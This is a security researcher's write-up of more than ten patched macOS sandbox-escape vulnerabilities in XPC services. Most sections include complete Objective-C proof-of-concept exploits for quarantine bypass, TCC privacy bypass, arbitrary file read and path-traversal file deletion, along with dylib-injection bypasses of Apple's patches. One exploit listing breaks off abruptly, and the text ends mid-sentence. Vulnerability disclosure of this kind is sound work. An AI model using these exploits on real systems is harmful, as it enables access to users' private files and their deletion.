    "originBody": "A New Era of macOS Sandbox Escapes: Diving into an Overlooked Attack Surface and Uncovering 10+ New Vulnerabilities This is a blog post for my presentation at the conference POC2024. The slides are uploaded here. In the macOS system, most processes are running in a restricted sandbox environment, whether they are Apple’s own services or third-party applications. Consequently, once an attacker gains Remote Code Execution (RCE) from these processes, their capabilities are constrained. The next step for the attacker is to circumvent the sandbox to gain enhanced execution capabilities and broader file access permissions. But how to discover sandbox escape vulnerabilities? Upon reviewing the existing issues, I unearthed a significant overlooked attack surface and a novel attack technique. This led to the discovery of multiple new sandbox escape vulnerabilities: CVE-2023-27944, CVE-2023-32414, CVE-2023-32404, CVE-2023-41077, CVE-2023-42961, CVE-2024-27864, CVE-2023-42977, and more. About the macOS Sandbox The App Sandbox Nowadays, as required by the Mac AppStore, most applications are running with the App Sandbox restrictions. The sandboxed application must have the entitlement “com.apple.security.app-sandbox”. The sandbox restrictions are applied in the dyld initialization function before the app’s main function. After entering the sandbox, it will be containerized and all the file operations will be limited to its data container path. It should be noted that all the files dropped by the sandboxed application will be marked as quarantined by default. The dropped files will have the special quarantine extended attribute. And the extended attribute can’t be removed by the sandboxed app due to the configuration in the sandbox profile: (deny file-write-xattr (xattr \"com.apple.quarantine\") (with no-log))) According to the Apple’s design guide: The applications without App Sandbox have unrestricted access to all user data and system resources. While the applications with the sandbox restrictions have only limited access. Specifically, the capabilities of a sandboxed application are defined in the rule configuration file /System/Library/Sandbox/Profiles/application.sb: For example, it will restrict access to certain system resources such as network and hardware. It also restricts the filesystem access and only a limited number of Mach services are reachable from a sandboxed application. BTW, the forked child process will also inherit the application sandbox restrictions of the parent process. But the process launched via the LaunchService.framework don’t inherit the sandbox restriction. For example, you can launch a non-sandboxed application via the system open command directly. The Service Sandbox Compared to the common application sandbox, the Service Sandbox is a bit different. Most Apple’s daemon services are running in a Service Sandbox context. They are restricted by the sandbox profiles defined in these system locations: /System/Library/Sandbox/Profiles/*.sb /usr/share/sandbox/*.sb The sandbox restrictions are applied in the service’s main function by calling the API sandbox_init_XXX, specified with a sandbox profile name or path manually. After entering the sandbox, they are usually not containerized. Most importantly, the dropped files are not quarantined by default, unless the quarantine-related APIs are invoked manually. The Attack Surfaces The Old Common Ways Attack via the LaunchService.framework The first common method is to attack the non-sandboxed applications via the system LaunchService framework. The application could natively exist on the macOS system, an example is the CVE-2021-30864, which can manipulate the $HOME environment variable for the system non-sandboxed application Terminal.app. When the Terminal application is launched, the malicious payload under the controlled home path $HOME/.profile will be executed without the sandbox restriction. Another attack scenario is to drop a new non-sandboxed application and then launch it. However, the newly dropped application will be quarantined and prevented from launching! So if we can drop a file or folder without being quarantined, then we can bypass the app sandbox completely. The example is the CVE-2023-32364, which abuses the devfs to drop a folder without being quarantined because the devfs doesn’t support the extended attributes. Attack the available Mach services The second common way to escape the sandbox is to attack the available Mach services listed in the app sandbox profile. All Mach service information on the system is stored in the file /System/Library/xpc/launchd.plist. And we can check if a Mach service is available to a sandboxed application by using the bootstrap_look_up API. So, it’s easy for us to enumerate all the Mach services available to app sandbox like this: void checkService(const char *serviceName) { mach_port_t service_port = MACH_PORT_NULL; kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port); if (!err) { NSLog(@\"available service:%s\", serviceName); mach_port_deallocate(mach_task_self_, service_port); } } void print_available_xpc(void) { NSDictionary* dict = [NSDictionary dictionaryWithContentsOfFile:@\"/System/Library/xpc/launchd.plist\"]; NSDictionary* launchDaemons = dict[@\"LaunchDaemons\"]; for (NSString* key in launchDaemons) { NSDictionary* job = launchDaemons[key]; NSDictionary* machServices = job[@\"MachServices\"]; for (NSString* serviceName in machServices) { checkService(serviceName.UTF8String); } } } Note that these Mach services exist either in the System domain or the User domain. More XPC services available to app sandbox are ignored by our researchers! The New Overlooked One The overlooked XPC services are those that exist in the PID domain. In contrast to old common XPC services that exist in the System/User domain, their service type is “Application” type rather than the “System” or “User” type. And they will be launched upon request by an app and terminate when the requesting application exits. The XPC services for the System/User domain are reachable to a sandboxed application only if they are defined in the sandbox profile “application.sb”. But all XPC services required by an app and its framework are visible to the app’s PID domain. It seems that most XPC services for the PID domain are not expected to be invoked from a sandboxed application, so there are no additional entitlement checks or sandbox checks for the incoming XPC clients. I drew a table to explain their differences: Let’s take the SystemShoveService.xpc as an example: It is an XPC bundle inside the system private ShoveService.framework. From the infoPlist dictionary, we can see that its “Service Type” is “Application” and its bundle identifier is “com.apple.installandsetup.shoveservice.system”. So, how to send requests to this XPC service from a sandboxed application? Through my research, I found that registering the XPC service to a sandboxed application’s PID domain is as simple as a single line of code: [[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework\"]load]; From the call stack backtrace of bundle loading, we can see that the XPC service will be registered to the app’s PID domain automatically when the corresponding framework is loaded. SystemShoveService.xpc does’t check the requested XPC client, so it can be exploited to escape the app sandbox after loading the ShoveService.framework. Moreover, it has the powerful SIP-related entitlement “com.apple.rootless.install”, and thus it can be exploited to bypass the SIP protection at the same time. The vulnerability has been designated as CVE-2022-26712. More details can be found from my previous blogpost. Generally speaking, all XPC services with the Service Type “Application” are potential targets to escape the app sandbox. So we can explore this overlooked attack surface by enumerating the XPC services in the system (private) frameworks: find /System/Library/Frameworks -name *.xpc find /System/Library/PrivateFrameworks -name *.xpc After discovering an XPC service for PID Domain that doesn’t check the incoming XPC client, we can attempt to attack the potential target by using the following two methods: Drop an app folder without being quarantined. (Get a full sandbox escape like the CVE-2023-32364 did.) Drop a file without being quarantined. (A ZIP or DMG file that contains a non-sandboxed application.) After diving into the new overlooked attack surface, I managed to discover dozens of new sandbox escape vulnerabilities. Next are the details. New Vulnerabilities & Exploitations Beta-No-CVE-1 Apple just credited me in their additional recognitions: You may wonder why there’s no CVE assigned for this vulnerability. According to Apple, “CVEs are only assigned to software vulnerabilities previously released to production and not to vulnerabilities for beta-only software.” This vulnerability only affects the macOS Sonoma Beta version. The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc The XPC service can be launched without any sandbox restrictions. It accepts all the incoming XPC clients by returning YES in the delegate method: The SKRemoteTaskRunnerProtocol has only one method “runTask:arguments:withReply:”. This only XPC method is designed to execute an arbitrary command with the specified arguments: At line 30, the executable path and arguments are controlled by the sandboxed XPC client. Therefore, an attacker can abuse this XPC method to execute an arbitrary system command directly without any sandbox restrictions. The exploit and demo @protocol SKRemoteTaskRunnerProtocol -(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply; @end void exploit_storagekitfsrunner(void) { [[NSBundle bundleWithPath:@\"/System/Library/PrivateFrameworks/StorageKit.framework\"] load]; NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.storagekitfsrunner\"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)]; [conn setInterruptionHandler:^{NSLog(@\"connection interrupted!\");}]; [conn setInvalidationHandler:^{NSLog(@\"connection invalidated!\");}]; [conn resume]; [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@\"/usr/bin/touch\"] arguments:@[@\"/tmp/sbx\"] withReply:^(NSNumber *bSucc, NSError *error) { NSLog(@\"run task result:%@, error:%@\", bSucc, error); }]; } Demo link: https://youtu.be/MYkdmFOUyFA The patch Apple promptly resolved the vulnerability prior to releasing macOS Sonoma 14.0 by completely removing the vulnerable XPC service from the operating system. Beta-No-CVE-2 There is no CVE assigned for this vulnerability too due to the same Beta-only reason. Apple just credited me in their additional recognitions: The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc The XPC service can be launched without any sandbox restrictions. It accepts all the incoming XPC clients by returning YES in the delegate method: The AudioAnalyticsHelperServiceProtocol has two methods: The issue exists in the second XPC method “createZipAtPath:hourThreshold:withReply:”. The following is pseudo-code from the Objective-c class AudioAnalyticsHelperService: // reversed from the Objective-c class AudioAnalyticsHelperService -(void) createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply { NSString *compressPath = [path stringByAppendingPathComponent:@\"compressed\"]; NSFileManager *fm = [NSFileManager defaultManager]; if (![fm fileExistsAtPath:compressPath]) { [fm createDirectoryAtPath:compressPath withIntermediateDirectories:YES attributes:nil error:nil]; } for (NSString *item in [fm contentsOfDirectoryAtPath:path error:nil]) { if ([[item pathExtension] isEqualToString:@\"json\"]) {// && the file creation date meets the requirement NSString *srcPath = [path stringByAppendingPathComponent:item]; NSString *dstPath = [compressPath stringByAppendingPathComponent:item]; [fm moveItemAtPath:srcPath toPath:dstPath error:nil]; } } NSString *zipPath = [path stringByAppendingPathComponent:[NSString stringWithFormat:@\"audio_analytics_reporting_%@.zip\", [self nowTimeString]]]; [self createZipArchiveForURL:[NSURL fileURLWithPath:compressPath] destinationURL:[NSURL fileURLWithPath:zipPath]]; } As we can see here, it helps to compress an arbitrary path that is specified by the XPC client. It first creates a folder named compressed in the specified path, if the path does not exist. It then enumerates the files in the specified path with the json suffix and moves them to the compressed folder. In the file move operation, an attacker can move an arbitrary file to an arbitrary location by replacing the compressed folder with a symlink. The source file content is not checked, but the destination file path must have the suffix json. Finally, it creates a zip file from the compressed folder. Note that the newly generated zip file will not be quarantined because the XPC service itself is not sandboxed at all. The exploit and demo @protocol AudioAnalyticsHelperServiceProtocol -(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply; -(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply; @end void exploit_AudioAnalyticsHelperService(void) { NSString *currentPath = NSTemporaryDirectory(); chdir([currentPath UTF8String]); NSLog(@\"======== preparing payload at the current path:%@\", currentPath); system(\"mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json\"); [@\"#!/bin/bashtouch /tmp/sbx\" writeToFile:@\"compressed/poc.app/Contents/MacOS/poc\" atomically:YES encoding:NSUTF8StringEncoding error:0]; system(\"chmod +x compressed/poc.app/Contents/MacOS/poc\"); [[NSBundle bundleWithPath:@\"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework\"] load]; NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.internal.audioanalytics.helper\"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)]; [conn resume]; [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){ NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath]; NSString *file; while ((file = [dirEnum nextObject])) { if ([[file pathExtension] isEqualToString: @\"zip\"]) { // open the zip NSString *cmd = [@\"open \" stringByAppendingString:file]; system([cmd UTF8String]); sleep(3); // wait for decompression and then open the payload (poc.app) NSString *cmd2 = [NSString stringWithFormat:@\"open /Users/%@/Downloads/%@/poc.app\", NSUserName(), [file stringByDeletingPathExtension]]; system([cmd2 UTF8String]); break; } } }]; } Demo link: https://youtu.be/7zd2Lun5r2s The patch Apple quickly addressed the vulnerability prior to releasing macOS Sonoma 14.0 by checking the entitlement “com.apple.audioanalytics.helper.service” from the incoming XPC client: If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly. Now in the latest macOS, the private AudioAnalyticsInternal.framework and the XPC service have been removed completely. CVE-2023-27944 The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/TrialServer.framework/XPCServices/TrialArchivingService.xpc This XPC service will enter the Service Sandbox by using the sandbox profile /System/Library/Sandbox/Profiles/com.apple.trial.TrialArchivingService.sb: However, the dropped files will not be quarantined. It accepts all the incoming XPC clients by returning YES in the delegate method: The TrialArchivingServiceProtocol has four methods: The issue exists in the XPC method “extractArchiveFromHandle:withArchiveName:toDirectory:destDirExtension:postExtractionCompression:completion:”. It helps to extract an archive file passed from a sandboxed application to a specified location. However, it doesn’t pass the quarantine extended attribute to the extracted content. The exploit and demo There is a small challenge to exploit the issue. By abusing the XPC method, the macho file in the archive will lose the executable (X) permission after the extraction. So the extracted application cannot be launched directly. Then I came up with a similar vulnerability to overcome this challenge: CVE-2021-30990 can be exploited not only to bypass the gatekeeper, but also to escape the application sandbox. The trick to that exploit is to use symlink rather than the macho file itself. Then I encountered another new challenge: This XPC method only supports to extract directories and regular files, and does not allow extracting symlink from the archive. To overcome the new challenge, I extract the payload application to the sandboxed app container path, where the sandboxed app has the read and write permission. (Luckily, the service sandbox profile is not too strict here.) Next, I can create the symlink from the sandboxed application directly, or just assign the executable permission to the extracted macho by calling the API chmod. (Another simple solution is to archive the payload application twice. Abusing the vulnerable XPC method to unpack the external zip file and then using the system open command to unpack the inner zip file.) The exploit code is as follows: @protocol TrialArchivingServiceProtocol- (void) extractArchiveFromHandle:(NSFileHandle *)archiveHandle withArchiveName:(NSString *)archiveName toDirectory:(NSURL *)dstURL destDirExtension:(NSString *)destDirToken postExtractionCompression:(unsigned long long)post completion:(void (^)(unsigned char))reply; @end void exploit_TrialArchivingService(void) { [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@\"/System/Library/PrivateFrameworks/TrialServer.framework\"]] load]; NSXPCConnection *connection = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.trial.TrialArchivingService\"]; connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(TrialArchivingServiceProtocol)]; [connection resume]; // archive file handle NSURL *payload = [[NSBundle mainBundle] URLForResource:@\"sbx.app\" withExtension:@\"zip\"]; NSFileHandle *archiveHandle = [NSFileHandle fileHandleForReadingAtPath:[payload path]]; // destination directory NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@\"Library/Trial/v0/AssetStore\"]; [[NSFileManager defaultManager]createDirectoryAtPath:dstPath withIntermediateDirectories:YES attributes:0 error:0]; NSURL *dstURL = [NSURL fileURLWithPath:dstPath]; // destination directory sandbox extension typedef const char *(*PFN)(const char *extension_class, const char *path, uint32_t flags); void *h = dlopen(\"/usr/lib/system/libsystem_sandbox.dylib\", 2); PFN sandbox_extension_issue_file = (PFN)dlsym(h, \"sandbox_extension_issue_file\"); const char *token = sandbox_extension_issue_file(\"com.apple.app-sandbox.read-write\", [dstPath UTF8String], 2); // fire the hole, it will extract the archive file bundle to this App container, without the quarantine extended attribute __block dispatch_semaphore_t done = dispatch_semaphore_create(0); [connection.remoteObjectProxy extractArchiveFromHandle:archiveHandle withArchiveName:@\"exploit\" toDirectory:dstURL destDirExtension:[NSString stringWithUTF8String:token] postExtractionCompression:0 completion:^(unsigned char ret) { NSLog(@\"ret:%d\", ret); dispatch_semaphore_signal(done); }]; dispatch_semaphore_wait(done, DISPATCH_TIME_FOREVER); // However, this extraction will drop the executable (X) permission.

CVE-2023-32414 The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/DesktopServicesPriv.framework/XPCServices/ArchiveService.xpc This XPC service will enter the service sandbox by using a sandbox profile, but the dropped files will not be quarantined. It accepts all the incoming XPC clients by returning YES in the delegate method: The DSArchiveServiceProtocolInternal has five methods: The issue exists in the XPC method “unarchiveItemWithURLWrapper:…”: This XPC method helps to unarchive an item passed from a sandboxed application to a specified location. However, it doesn’t pass the quarantine extended attribute to the extracted content. Therefore, a sandboxed application can drop arbitrary files without being marked as quarantined by abusing this XPC method. The exploit and demo The XPC client has already been implemented in the Objective-c class DSArchiveService within the DesktopServicesPriv.framework. The exploit code is as follows: @interface DSArchiveService : NSObject - (void)unarchiveItemAtURL:(id) itemURL passphrase:(id) password destinationFolderURL:(id) dstURL completionHandler:(void (^)(NSURL *, NSError *))arg2; @end void prepare(void) { NSLog(@\"preparing %@/payload.zip\", NSHomeDirectory()); system(\"mkdir -p poc.app/Contents/MacOS; mkdir dst\"); [@\"#!/bin/bashtouch /tmp/sbx\" writeToFile:@\"poc.app/Contents/MacOS/poc\" atomically:YES encoding:NSUTF8StringEncoding error:0]; system(\"chmod +x poc.app/Contents/MacOS/poc; zip -r payload.zip poc.app\"); } void exploit_ArchiveService(void) { [[NSBundle bundleWithURL:[NSURL fileURLWithPath:@\"/System/Library/PrivateFrameworks/DesktopServicesPriv.framework\"]] load]; DSArchiveService *service = [[objc_getClass(\"DSArchiveService\") alloc]init]; NSString *payloadPath = [NSHomeDirectory() stringByAppendingPathComponent:@\"payload.zip\"]; NSString *dstPath = [NSHomeDirectory() stringByAppendingPathComponent:@\"dst\"]; [service unarchiveItemAtURL:[NSURL fileURLWithPath:payloadPath] passphrase:nil destinationFolderURL:[NSURL fileURLWithPath:dstPath] completionHandler:^(NSURL *dstFolder, NSError *error) { NSLog(@\"dstFolderURL:%@, error:%@\", dstFolder, error); NSString *cmd = [NSString stringWithFormat:@\"open %@/poc.app\", [dstFolder path]]; system([cmd UTF8String]); }]; } Demo link: https://youtu.be/RMyKyHYibSk The patch Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement “com.apple.private.ArchiveService.XPC” from the incoming XPC client: If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly. CVE-2023-32404 The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc The XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox. Moreover, it also has the special TCC entitlement in its code signature for Full Disk Access: Therefore, it can also be exploited to bypass the TCC protection completely! It accepts all the incoming XPC clients by returning YES in the delegate method: The WFFileAccessHelperProtocol has only one method extendAccessToURL:completion:: The only XPC method is designed to grant the read and write permission of an arbitrary URL to the XPC client: Internally, it calls the API sandbox_extension_issue_file to issue the file access token. The arbitrary URL is specified from the sandboxed XPC client. The exploit and demo @protocol WFFileAccessHelperProtocol - (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2; @end typedef int (*PFN)(const char *); void expoit_ShortcutsFileAccessHelper(NSString *target) { [[NSBundle bundleWithPath:@\"/System/Library/PrivateFrameworks/WorkflowKit.framework\"]load]; NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.WorkflowKit.ShortcutsFileAccessHelper\"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)]; [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass(\"FPSandboxingURLWrapper\")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1]; [conn resume]; [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) { NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding]; NSURL *targetURL = [fpWrapper url]; void *h = dlopen(\"/usr/lib/system/libsystem_sandbox.dylib\", 2); PFN sandbox_extension_consume = (PFN)dlsym(h, \"sandbox_extension_consume\"); if (sandbox_extension_consume([sbxToken UTF8String]) == -1) NSLog(@\"Fail to consume the sandbox token:%@\", sbxToken); else { NSLog(@\"Got the file R&W permission with sandbox token:%@\", sbxToken); NSLog(@\"Read the target content:%@\", [NSData dataWithContentsOfURL:targetURL]); } }]; } Demo link: https://youtu.be/5FVDe8Le1pw The patch Apple addressed the vulnerability in macOS Ventura 13.4 by checking the entitlement “com.apple.shortcuts.file-access-helper” from the incoming XPC client: If the client doesn’t have the special entitlement in its code signature, the XPC service will deny the XPC connection directly. CVE-2023-41077 The issue The vulnerability exists in the XPC service: /System/Library/Frameworks/ImageCaptureCore.framework/XPCServices/mscamerad-xpc.xpc Similarly, the XPC service can be launched without any sandbox restrictions. So it can be exploited to escape the application sandbox. What’s more, it has the special TCC entitlement in its code signature to access the Photos and Removable Volumes directly without prompting the users: Therefore, it can also be exploited to bypass these TCC protections at the same time! The main logic is to listen at the service named “com.apple.mscamerad-xpc”. Similarly, this XPC service accepts all the incoming XPC clients by returning YES in the delegate method: The ICXPCDeviceManagerProtocol has six methods: Specially, the XPC method “openDevice:withReply:” is designed to open and construct a new MSCameraDevice: During the initialization of the new device, it listens at another anonymous XPC service to provide some service routines for the new camera device: The anonymous XPC service accepts all the incoming XPC clients by returning YES in the camera device’s delegate method: The ICCameraDeviceProtocol has 23 methods: The issue exists in the XPC method “requestReadDataFromObjectHandle:options:withReply:”: It reads the file content for the requested file item and replies the file content data to the XPC client. The requested file path is controlled from the XPC client. So a sandboxed application can exploit this XPC method to read an arbitrary file outside of the sandbox container. At the same time, the sandboxed app can also read the user’s Photos directly without prompting the users due to the service’s powerful TCC entitlements. The exploit and demo In order to trigger the vulnerability, we need to prepare the camera device and the camera file. Through my research, I discovered that the MSCameraDevice can be emulated by creating a DMG file and mounting it. Next, if a file path in the DMG volume matches the special regular expression, then the file item will be indexed as an ICCameraFile and the file data can be requested via the vulnerable XPC method: folderNameRegex = [NSRegularExpression regularExpressionWithPattern:@\"^([1-9]{1}[\\\\d]{2}[\\\\w]{5})$|^((?i)\\\\bDCIM\\\\b)$\" options:16 error:0];// e.g. 123abcde, DCIM, dcIm, ... fileNameRegex = [NSRegularExpression regularExpressionWithPattern:@\"^[\\\\w]{4}(E){0,1}(\\\\d){4}\\\\.(([\\\\w]){3}|HEIC)$\" options:16 error:0];// e.g. abcd1234.mp3, 1234E5678.HEIC So we can make a fake camera device and camera file like this: A sandboxed application could drop the DMG file and then open the DMG file to mount it to trigger the issue. The XPC client has already been implemented in the ImageCaptureCore framework. The exploit code is as follows: @interface MyDeviceDelegate : NSObject @end @implementation MyDeviceDelegate - (void)cameraDevice:(ICCameraDevice *)camera didAddItems:(NSArray *)items { NSLog(@\"didAddItems\"); for (ICCameraFile *item in items) { NSLog(@\"new file item:%@\", item); // TODO: I should check the item type(file/folder) and item name here. [item requestReadDataAtOffset:0 length:item.fileSize completion:^(NSData *data, NSError *err) { NSLog(@\"Got file data:%@ (%@)\", data, [NSString stringWithCString:[data bytes] encoding:NSUTF8StringEncoding]); }]; } } @end @interface MyDeviceBrowserDelegate : NSObject @end @implementation MyDeviceBrowserDelegate - (void)deviceBrowser:(ICDeviceBrowser *)browser didAddDevice:(ICDevice *)device moreComing:(BOOL)moreComing { NSLog(@\"didAddDevice:%@\", device); device.delegate = devDelegate; // instance of MyDeviceDelegate [device requestOpenSession]; } @end void exploit(void) { ICDeviceBrowser *deviceBrowser = [[ICDeviceBrowser alloc]init]; MyDeviceBrowserDelegate *browserDelegate = [[MyDeviceBrowserDelegate alloc]init]; deviceBrowser.delegate = browserDelegate; [deviceBrowser start]; } Demo link: https://youtu.be/bvJwne8b2g4 The patch 1 Apple addressed the vulnerability in macOS Sonoma 14 by adding a new check in the function acceptConnection:: The check function returns OK if the incoming XPC client meets one of the following two conditions: Return OK if the client has the private entitlement: “com.apple.private.imagecapturecore.authorization_bypass”. Return OK if the client is a platform binary! The bypass 1 The second condition doesn’t make any sense because the platform binary is not trustworthy and easy to inject! Then I reported the new issue to Apple. As a result, Apple assigned CVE-2024-23253 to this bypass report: Here’s how I bypassed the patch to access the TCC-protected contents: Make a dylib from the previous old exploit code Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., /bin/ls) Inject into the platform binary by using the environment variable DYLD_INSERT_LIBRARIES Talk to the XPC service as before The patch 2 Apple patched the issue again in macOS 14.4 by hardening the second condition: From the new patch code, we can see that it requires the XPC client to not only be the platform binary, but also to be signed with the flags: “**CS_REQUIRE_LV CS_FORCED_LV**”. The bypass 2 Apple thought that the new required flags would kill the dynamic library injection exploits. But they were wrong. The checks here can still be bypassed! Again, I reported the new bypass to Apple and they assigned the new CVE-2024-40831 for it: Here’s how I exploited it again: Make a dylib from the previous old exploit code Choose a platform binary (It must be signed by Apple and has no entitlements. e.g., /bin/ls) Inject into the platform binary by using the environment variable DYLD_INSERT_LIBRARIES Set the required flags manually Talk to the XPC service as before Compared to the previous exploit, only one additional step has been added. After injecting into the platform binary “ls” command, the exploit process doesn’t have the required flags. However, the desired flags can be set manually at runtime via the system API “csops”: As a result, the exploit process will bypass all the checks and talk to the XPC service as before! The patch 3 Apple patched this issue again in macOS Sequoia 15: Now, It will approve the XPC connection, only if the XPC client has the private entitlement: “com.apple.private.imagecapturecore.authorization_bypass”. CVE-2023-42961 Note that this vulnerability can also be exploited on iOS. The issue The vulnerability exists in the XPC service: /System/Library/Frameworks/Intents.framework/XPCServices/intents_helper.xpc The XPC service can be launched without any sandbox restrictions. It accepts all the incoming XPC clients by returning YES in the delegate method: The INHServing protocol has 11 methods: There is a path traversal issue in the function named “filePathForImageWithFileName”: The function parameter fileName is an arbitrary string, that can be controlled by the XPC client. This vulnerable function can be reached from two XPC methods: The first XPC method is named “retrieveImageWithIdentifier:completion:”: It can be abused to read an arbitrary file with extension “.png”, and the retrieved data will be stored in a member variable of the “INImage” instance and replied to the XPC client. The second XPC method is named “purgeImageWithIdentifier:completion:”: It can be exploited to delete an arbitrary file path. The exploit and demo @protocol INHServing - (oneway void)purgeImageWithIdentifier:(NSString *)arg1 completion:(void (^)(NSError *))arg2; - (oneway void)retrieveImageWithIdentifier:(NSString *)arg1 completion:(void (^)(INImage *, NSError *))arg2; @end void exploit_intents_helper(NSString *target) { [[NSBundle bundleWithPath:@\"/System/Library/Frameworks/Intents.framework\"]load]; NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.intents.intents-helper\"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(INHServing)]; [conn setInterruptionHandler:^{ NSLog(@\"connection interrupted!\"); }]; [conn setInvalidationHandler:^{ NSLog(@\"connection invalidated!\"); }]; [conn resume]; [[conn remoteObjectProxy] purgeImageWithIdentifier:[@\"../../../../..\" stringByAppendingPathComponent:target] completion:^(NSError *error) { NSLog(@\"error:%@\", error); }]; } Demo link: https://youtu.be/X0fv3x6bmF8 The patch Apple addressed the vulnerability in macOS Sonoma 14.0 by sanitizing the input string from the XPC client: The special characters used for path traversal will be trimmed. CVE-2024-27864 The CVE entry is waiting to be published. The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/DiskImages2.framework/XPCServices/diskimagescontroller.xpc This XPC service is powerful because it has the special entitlement “com.apple.diskimages.creator-uc” in its code signature: This entitlement has two main functions: Talk to /usr/libexec/diskimagesiod, which has the FDA entitlement and does the real attach job. Connect to the IOKit Service “AppleDiskImagesController” (/System/Library/Extensions/AppleDiskImages2.kext), which creates and quarantines a device for a DMG file. Similarly, the XPC service accepts all the incoming XPC clients by returning YES in the delegate method: The DIControllerProtocol has 10 methods: The first issue exists in the XPC method named “attachWithParams:reply:”: At line 12, it calls the function “checkAttachEntitlementWithError”. As the name implies, the checker function should check the entitlement of the incoming XPC client. However, it always returns TRUE: The XPC client has already been implemented in the DiskImages2.framework as the objective-c class DIAttachParams. And the XPC connection can be established via the method “-[DIAttachParams newAttachWithError:]”. So I could reuse the framework code directly like this to attach a DMG volume without reinventing the wheels: NSError *error=nil; DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@\"quarantined_payload.dmg\"] error:&error]; [params newAttachWithError:&error]; However, I discovered that the client code in the framework will check whether the input URL is quarantined: If the input URL is quarantined, it will set the quarantine parameter before invoking the XPC method to attach. This will notify the XPC service to quarantine the target device. So in my own XPC client, I can skip the quarantine parameter setting and invoke the XPC method to attach directly. As a result, the XPC service will attach a quarantined DMG file without quarantining the corresponding device. The exploit and demo In order to skip setting the quarantine parameter, I have to rewrite the XPC client code by myself: @protocol DIControllerProtocol - (void)dupWithStderrHandle:(NSFileHandle *)arg1 reply:(void (^)(NSError *))arg2; - (void)attachWithParams:(DIAttachParams *)arg1 reply:(void (^)(NSError *))reply; @end @interface DIController2Client : NSObject @end @implementation DIController2Client - (void)attachCompletedWithHandle:(NSFileHandle *)handle reply:(void (^)(NSError *))reply { NSLog(@\"attachCompletedWithHandle:%@\", handle); system(\"open /Volumes/.exploit/poc.app\"); // launch the app from the payload.dmg (unquarantined mounting) reply(0); } @end void exploit_diskimages2(void) { [[NSBundle bundleWithPath:@\"/System/Library/PrivateFrameworks/DiskImages2.framework\"] load]; NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@\"com.apple.diskimagescontroller\"]; conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIControllerProtocol)]; conn.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(DIController2ClientProtocol)]; conn.exportedObject = [[DIController2Client alloc]init]; [conn resume]; id proxy = [conn remoteObjectProxy]; // [proxy dupWithStderrHandle:[NSFileHandle fileHandleWithStandardError] reply:^(NSError *err) {}]; DIAttachParams *params = [[DIAttachParams alloc] initWithURL:[NSURL fileURLWithPath:@\"payload.dmg\"] error:nil]; [proxy attachWithParams:params reply:^(NSError *err) { // the quarantined payload.dmg (dropped by this sandboxed app) will be attached without being quarantined! NSLog(@\"attach error:%@\", err); }]; } Demo link: https://youtu.be/FYcFwkgiGzw The patch Apple addressed the vulnerability in macOS Sonoma 14.4 by moving the verification logic from the client side to the server side. It will quarantine the corresponding device directly from the server, if the input file path is quarantined. CVE-2023-42977 The issue The vulnerability exists in the XPC service: /System/Library/PrivateFrameworks/PowerlogCore.framework/XPCServices/PerfPowerServicesSignpostReader.xpc The XPC service can be launched without any sandbox restrictions. It accepts all the incoming XPC clients by returning YES in the delegate method: The XPCSignpostReaderProtocol has 6 methods: However, Apple has only implemented one XPC method named “submitSignpostDataWithConfig:withReply:”, the other 5 XPC methods are empty implementations. The core logic of this XPC method is to collect the log data and archive it to a gzip file. It seems that the log archive data will later be submitted to the Apple servers. However, there is a path traversal issue in this XPC method: Because the variable “tagUUID” is an 